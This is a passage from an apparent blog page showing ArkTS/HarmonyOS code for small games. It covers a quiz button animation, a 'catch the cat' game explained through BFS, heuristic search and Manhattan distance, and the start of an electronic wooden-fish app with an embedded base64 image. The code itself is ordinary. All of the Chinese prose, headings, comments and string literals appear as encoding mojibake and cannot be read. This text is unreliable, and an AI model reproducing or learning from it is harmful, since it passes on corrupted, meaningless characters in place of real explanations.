class="number">1</span>, <span class="attr">right</span>: <span class="number">1</span> &#125;)</span><br><span class="line">          .<span class="title function_">clickEffect</span>(&#123; <span class="attr">scale</span>: <span class="number">0.8</span>, <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">MIDDLE</span> &#125;)</span><br><span class="line">          .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">showAnimation</span>)&#123;</span><br><span class="line">              <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">showAnimation</span> = <span class="literal">true</span></span><br><span class="line">            <span class="keyword">let</span> <span class="attr">itemX</span>:number = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">0</span>)&#123;</span><br><span class="line">              itemX = -<span class="number">270</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">1</span>)&#123;</span><br><span class="line">              itemX = -<span class="number">90</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">2</span>)&#123;</span><br><span class="line">              itemX = <span class="number">90</span></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(category.<span class="property">type</span>==<span class="number">3</span>)&#123;</span><br><span class="line">              itemX = <span class="number">270</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">              <span class="attr">duration</span>:<span class="number">200</span>,</span><br><span class="line">              <span class="attr">onFinish</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                  <span class="attr">duration</span>:<span class="number">800</span>,</span><br><span class="line">                  <span class="attr">curve</span>: curves.<span class="title function_">springCurve</span>(<span class="number">0</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">20</span>),</span><br><span class="line">                  <span class="attr">onFinish</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">                    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">                      <span class="attr">duration</span>:<span class="number">200</span>,</span><br><span class="line">                      <span class="attr">onFinish</span>:<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">itemXPosition</span> = <span class="number">0</span></span><br><span class="line">                        <span class="variable language_">this</span>.<span class="title function_">checkAnswer</span>(category.<span class="property">type</span>);</span><br><span class="line">                        <span class="variable language_">this</span>.<span class="property">showAnimation</span> = <span class="literal">false</span></span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                      <span class="variable language_">this</span>.<span class="property">itemXPosition</span> = <span class="number">0</span></span><br><span class="line">                      <span class="variable language_">this</span>.<span class="property">scaleOptions</span> = &#123; <span class="attr">x</span>: <span class="number">1.0</span>, <span class="attr">y</span>: <span class="number">1.0</span> &#125;;</span><br><span class="line">                    &#125;)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">                  <span class="variable language_">this</span>.<span class="property">scaleOptions</span> = &#123; <span class="attr">x</span>: <span class="number">1.3</span>, <span class="attr">y</span>: <span class="number">1.3</span> &#125;;</span><br><span class="line">                &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">itemXPosition</span> = itemX</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>).<span class="title function_">clickEffect</span>(&#123; <span class="attr">level</span>: <span class="title class_">ClickEffectLevel</span>.<span class="property">LIGHT</span> &#125;).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">50</span> &#125;).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">resetQuiz</span>()</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="catch-cat"><a href="#catch-cat" class="headerlink" title="catch cat"></a>catch cat</h1><p>å›´ä½ç¥ç»çŒ«</p><h1 id="ç®—æ³•-1"><a href="#ç®—æ³•-1" class="headerlink" title="ç®—æ³•"></a>ç®—æ³•</h1><h2 id="1-å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰ï¼š"><a href="#1-å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰ï¼š" class="headerlink" title="1. å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰ï¼š"></a>1. å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰ï¼š</h2><p>å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBreadth-First Searchï¼Œç®€ç§° BFSï¼‰æ˜¯ä¸€ç§ç”¨äºå›¾å’Œæ ‘ç»“æ„çš„éå†æˆ–æœç´¢ç®—æ³•ã€‚å®ƒä»ä¸€ä¸ªèµ·å§‹èŠ‚ç‚¹å¼€å§‹ï¼Œé¦–å…ˆè®¿é—®è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰é‚»æ¥èŠ‚ç‚¹ï¼Œç„¶åå†ä»¥åŒæ ·çš„æ–¹å¼é€å±‚è®¿é—®è¿™äº›é‚»æ¥èŠ‚ç‚¹çš„é‚»æ¥èŠ‚ç‚¹ï¼Œç›´åˆ°è®¿é—®å®Œæ•´ä¸ªå›¾æˆ–è€…æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹ä¸ºæ­¢ã€‚BFSçš„ç‰¹ç‚¹æ˜¯æŒ‰ç…§ä»è¿‘åˆ°è¿œçš„é¡ºåºè®¿é—®èŠ‚ç‚¹ï¼Œå› æ­¤å®ƒéå¸¸é€‚åˆç”¨æ¥å¯»æ‰¾æœ€çŸ­è·¯å¾„é—®é¢˜ï¼Œå°¤å…¶æ˜¯åœ¨æ‰€æœ‰è¾¹çš„æƒé‡ç›¸ç­‰çš„æƒ…å†µä¸‹ã€‚</p><p>BFSçš„åŸºæœ¬æ­¥éª¤å¦‚ä¸‹ï¼š<br>åˆå§‹åŒ–ï¼šé€‰æ‹©ä¸€ä¸ªèµ·å§‹èŠ‚ç‚¹ï¼Œå°†å…¶æ”¾å…¥é˜Ÿåˆ—ï¼Œå¹¶æ ‡è®°ä¸ºå·²è®¿é—®ã€‚<br>å¾ªç¯å¤„ç†ï¼š<br>ä»é˜Ÿåˆ—ä¸­å–å‡ºç¬¬ä¸€ä¸ªèŠ‚ç‚¹ã€‚<br>æ£€æŸ¥è¯¥èŠ‚ç‚¹æ˜¯å¦ä¸ºç›®æ ‡èŠ‚ç‚¹ï¼›å¦‚æœæ˜¯ï¼Œåˆ™ç»“æŸæœç´¢ã€‚<br>å¦åˆ™ï¼Œå°†è¯¥èŠ‚ç‚¹çš„æ‰€æœ‰æœªè®¿é—®è¿‡çš„é‚»æ¥èŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—ï¼Œå¹¶æ ‡è®°ä¸ºå·²è®¿é—®ã€‚<br>ç»ˆæ­¢æ¡ä»¶ï¼šå½“é˜Ÿåˆ—ä¸ºç©ºæ—¶ï¼Œè¡¨ç¤ºæ‰€æœ‰å¯åˆ°è¾¾çš„èŠ‚ç‚¹éƒ½å·²ç»è¢«è®¿é—®è¿‡ï¼Œå¦‚æœæ­¤æ—¶è¿˜æ²¡æœ‰æ‰¾åˆ°ç›®æ ‡èŠ‚ç‚¹ï¼Œåˆ™è¯´æ˜ç›®æ ‡èŠ‚ç‚¹ä¸å¯è¾¾ã€‚</p><p>åœ¨ findNeighbors æ–¹æ³•ä¸­ï¼Œé€šè¿‡éå†å½“å‰å•å…ƒæ ¼çš„é‚»å±…æ¥è·å–å‘¨å›´éå¢™å£ä¸”å¯ä»¥ç§»åŠ¨çš„å•å…ƒæ ¼é›†åˆã€‚è¿™ç±»ä¼¼äºå¹¿åº¦ä¼˜å…ˆæœç´¢çš„æ€æƒ³ï¼Œé€å±‚éå†é‚»å±…å•å…ƒæ ¼ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">findNeighbors</span>(<span class="attr">cell</span>: <span class="title class_">Cell</span>): <span class="title class_">Cell</span>[] &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">neighbors</span>: <span class="title class_">Cell</span>[] = [];</span><br><span class="line">    <span class="comment">// æ£€æŸ¥å½“å‰å•å…ƒæ ¼çš„å…­ä¸ªæ–¹å‘é‚»å±…ï¼Œå°†éå¢™å£ä¸”å¯ä»¥ç§»åŠ¨çš„å•å…ƒæ ¼åŠ å…¥é›†åˆ</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> neighbors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-å¯å‘å¼æœç´¢ï¼š"><a href="#2-å¯å‘å¼æœç´¢ï¼š" class="headerlink" title="2. å¯å‘å¼æœç´¢ï¼š"></a>2. å¯å‘å¼æœç´¢ï¼š</h2><p>åœ¨ selectNextMove æ–¹æ³•ä¸­ï¼Œæ ¹æ®ä¸€å®šçš„å¯å‘å¼å‡½æ•°é€‰æ‹©ä¸‹ä¸€ä¸ªç§»åŠ¨ä½ç½®ï¼Œä»¥ç¡®ä¿å°çŒ«æœç€ç¦»è¾¹ç•Œæœ€è¿‘çš„æ–¹å‘ç§»åŠ¨ã€‚è¿™ç§å¯å‘å¼æœç´¢å¯ä»¥å¸®åŠ©å°çŒ«æ›´æ™ºèƒ½åœ°é€‰æ‹©ä¸‹ä¸€æ­¥çš„ç§»åŠ¨ä½ç½®ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">selectNextMove</span>(<span class="attr">emptyNeighbors</span>: <span class="title class_">Cell</span>[]): <span class="title class_">Cell</span> &#123;</span><br><span class="line">    <span class="comment">// æ ¹æ®å¯å‘å¼å‡½æ•°é€‰æ‹©æœ€ä¼˜çš„ç§»åŠ¨ä½ç½®</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> closestToEdge || emptyNeighbors[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—ï¼š"><a href="#3-æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—ï¼š" class="headerlink" title="3. æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—ï¼š"></a>3. æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—ï¼š</h2><p>æ›¼å“ˆé¡¿è·ç¦»ï¼ˆManhattan Distanceï¼‰ï¼Œä¹Ÿç§°ä¸ºåŸå¸‚è¡—åŒºè·ç¦»ï¼ˆCity Block distanceï¼‰æˆ–å‡ºç§Ÿè½¦å‡ ä½•ï¼Œæ˜¯è¡¡é‡åœ¨æ ‡å‡†åæ ‡ç³»ä¸­ä¸¤ä¸ªç‚¹ä¹‹é—´æ²¿è½´å‘è·ç¦»çš„æ€»å’Œã€‚ç®€å•æ¥è¯´ï¼Œå®ƒæ˜¯ä»ä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹ï¼Œåœ¨åªå…è®¸æ°´å¹³æˆ–å‚ç›´ç§»åŠ¨çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»ç»è¿‡çš„æœ€å°è·ç¦»ã€‚è¿™ä¸ªæ¦‚å¿µå¾—åäºç¾å›½çº½çº¦å¸‚æ›¼å“ˆé¡¿åŒºçš„è¡—é“å¸ƒå±€ï¼Œå› ä¸ºé‚£é‡Œçš„è¡—é“å¤§å¤šå‘ˆç½‘æ ¼çŠ¶åˆ†å¸ƒï¼Œè½¦è¾†åªèƒ½æ²¿ç€è¿™äº›è¡—é“è¡Œé©¶ï¼Œè€Œä¸èƒ½æ–œç©¿ã€‚</p><p>åœ¨ computeHeuristic æ–¹æ³•ä¸­ï¼Œä½¿ç”¨æ›¼å“ˆé¡¿è·ç¦»è®¡ç®—å¯å‘å¼å‡½æ•°çš„å€¼ï¼Œä»¥è¯„ä¼°å½“å‰å•å…ƒæ ¼åˆ°è¾¹ç•Œçš„è·ç¦»ã€‚æ›¼å“ˆé¡¿è·ç¦»æ˜¯åœ¨ç½‘æ ¼ä¸Šä¸¤ç‚¹ä¹‹é—´çš„è·ç¦»ï¼Œæ²¿ç€ç½‘æ ¼çš„è¾¹ç¼˜ç§»åŠ¨ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">computeHeuristic</span>(<span class="attr">cell</span>: <span class="title class_">Cell</span>): number &#123;</span><br><span class="line">    <span class="comment">// è®¡ç®—æ›¼å“ˆé¡¿è·ç¦»ä½œä¸ºå¯å‘å¼å‡½æ•°çš„å€¼</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> minDistanceX + minDistanceY;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="wood-fish"><a href="#wood-fish" class="headerlink" title="wood fish"></a>wood fish</h1><p>ç”µå­æœ¨é±¼</p><p>animateToImmediately </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è§‚å¯Ÿè€…æ¨¡å¼è£…é¥°å™¨</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  <span class="attr">value</span>: string = <span class="string">&#x27;åŠŸå¾·+1&#x27;</span>; <span class="comment">// é»˜è®¤æ˜¾ç¤ºçš„æ–‡å­—</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// è·Ÿè¸ªå±æ€§å˜åŒ–</span></span><br><span class="line">  <span class="attr">opacity</span>: number = <span class="number">0</span>; <span class="comment">// æ–‡å­—é€æ˜åº¦</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="comment">// è·Ÿè¸ªå±æ€§å˜åŒ–</span></span><br><span class="line">  <span class="attr">y</span>: number = <span class="number">0</span>; <span class="comment">// æ–‡å­—çš„å‚ç›´åç§»é‡</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ä¸»å…¥å£ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">list</span>: <span class="title class_">Cell</span>[] = []; <span class="comment">// å­˜å‚¨æ‰€æœ‰ Cell å¯¹è±¡çš„æ•°ç»„</span></span><br><span class="line">  <span class="attr">indexCount</span>: number = <span class="number">0</span>; <span class="comment">// è®°å½•å½“å‰æ»šåŠ¨çš„ç´¢å¼•</span></span><br><span class="line">  <span class="attr">count</span>: number = <span class="number">10</span>; <span class="comment">// åˆ—è¡¨ä¸­ Cell å¯¹è±¡çš„æ•°é‡</span></span><br><span class="line">  <span class="attr">image</span>: string =</span><br><span class="line">    <span class="string">&#x27;data:image/png;base64,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&#x27;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–æ–¹æ³•ï¼Œåœ¨ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶è¢«è°ƒç”¨</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">count</span>; i++) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">Cell</span>()); <span class="comment">// åˆå§‹åŒ– Cell æ•°ç»„</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»º UI çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€å®¹å™¨</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå †æ ˆå¸ƒå±€å®¹å™¨</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">list</span>, <span class="function">(<span class="params">item: Cell, 